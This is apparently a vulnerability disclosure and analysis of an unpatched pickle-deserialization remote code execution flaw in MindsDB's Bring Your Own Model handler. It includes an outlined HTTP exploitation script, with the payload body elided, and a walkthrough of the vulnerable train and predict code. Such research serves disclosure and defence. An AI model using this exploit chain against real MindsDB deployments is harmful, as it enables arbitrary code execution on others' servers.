...
MindsDB is an open-source AI SQL Server that allows developers to train and deploy machine learning models through a SQL interface. Its BYOM (Bring Your Own Model) feature allows users to upload custom Python model code.
...
```bash
# 1. Clone vulnerable version source code
...
After the service starts, it listens on `http://127.0.0.1:47334` by default.

## Vulnerability Reproduction

The reproduction steps are quite involved, so I'll use a script for reproduction.

First, let me outline the overall script logic flow:

```
1. PUT /api/handlers/byom/<engine_name>
   └─→ Upload malicious BYOM handler code

2. CREATE ML_ENGINE <engine_name>
   └─→ Register malicious handler, type='inhouse'

3. CREATE MODEL <model_name>
   └─→ FROM <engine_name>
   └─→ Trigger train() → pickle.dumps(malicious object)
   └─→ Model state persisted to storage

4. SELECT * FROM <model_name> WHERE ...
   └─→ Trigger predict() → pickle.loads(model_state)
   └─→ __reduce__() → arbitrary code execution
```

#### Full HTTP API Exploitation Script
...
# Malicious pickle payload - __reduce__ automatically executes during pickle.loads()
# Note: Second argument must be a tuple
MALICIOUS_CODE = """
import subprocess
...
"""
    ...
    # Step 1: Clean old resources
    print("[*] Step 1: Cleaning old resources...")
    ...
    # Step 2: Upload malicious BYOM handler via PUT (upload code directly, no local files needed)
    ...
    # Step 3: CREATE MODEL - trigger train() → pickle.dumps()
    print("[*] Step 3: CREATE MODEL (trigger train to inject payload)...")
    query_model = """
    ...
    # Step 4: SELECT ... WHERE - trigger predict() → pickle.loads() → RCE
    print("[*] Step 4: SELECT ... WHERE (trigger pickle.loads RCE)...")
...
def main():
    ...
    try:
        ...
        if resp.status_code != 200:
            ...
            return
        print(f"[+] MindsDB service is running: {args.target}")
...
![Exploitation Result](https://gitee.com/nn0nkey/picture/raw/master/img/20260114215217296.png)
...
#### Model Code Retrieval

```python
def _get_model_proxy(self, version=None):
    """
    Get model wrapper based on version
    ...
    if version_str not in self.model_wrappers:
        ...
        if engine_version_type == BYOM_TYPE.INHOUSE:
            ...
            # Create safe ModelWrapperSafe (using subprocess isolation)
...
- When BYOM type is `INHOUSE`, a `ModelWrapperUnsafe` instance is created. `ModelWrapperUnsafe` handles user code directly in the main process, and most importantly, uses pickle for serialization/deserialization.
...
class ModelWrapperUnsafe:
    ...
    def train(self, df, target, args):
        ...
        # 🔴 Vulnerability point: Directly serialize controllable __dict__
    ...
    def predict(self, df, model_state, args):
        ...
        """
        # 🔴 Vulnerability point: Unsafe deserialization
        # model_state comes from storage, but content was controlled by user in train()
...
There are many deserialization points. Any place that calls `pickle.loads` is a vulnerability point, because we can override this class and any of its methods, meaning the parameters are completely under our control.

The `train` point uses `return pickle.dumps(self.model_instance.__dict__, protocol=5)`, directly serializing `model_instance.__dict__`, so our POC modifies `self.__dict__` to inject malicious objects.

Other points involve deserialization. The core is always `pickle.loads`, but the key is whether there's an API that can trigger the method call.
...
def get_input():
    # Read from stdin and deserialize object
...
Call the malicious model's `train()` method, then get the model's `__dict__` and use `encode()` i.e., `pickle.dumps()` to serialize it.

---

#### PREDICT Processing Logic

Our data is only serialized but not yet deserialized. We saw above that there are many load methods in the class, such as predict:
...
```python
    ...
    # 🔴 Vulnerability point: Deserialize model_state
...
Uses `decode()` i.e., `pickle.loads()` to deserialize `model_state`. When `model_state` is a malicious object with a `__reduce__()` method, it will automatically execute the code in that object.

---

How are these two methods triggered?
...
When calling the create method, `model_proxy.train()` returns `model_state` which is then placed in storage and will be read and deserialized during `predict()`.
...
def predict(self, df, args=None):
    ...
    # 🔴 Call predict() - pass model_state in, triggers pickle.loads()
    pred_df = model_proxy.predict(df, model_state, pred_args)

    return pred_df
```

When calling SELECT, read model_state from storage, call predict() - pass model_state in, triggering pickle.loads().
...
Python's `pickle` module automatically calls special methods of objects during deserialization. The `__reduce__()` method returns a tuple `(callable, args)`, and pickle will execute `callable(*args)`.
...
When `pickle.dumps(model.__dict__)` is called, the `malicious` object in `__dict__` will be serialized. Later when `pickle.loads()` is called, `MaliciousObject.__reduce__()` will be automatically executed.
...
3. SELECT ... (calls BYOMHandler.predict)
   ...
   │   Reads data containing malicious object
   │
...
Since this is a newly discovered vulnerability, it has not yet been fixed by the official team.
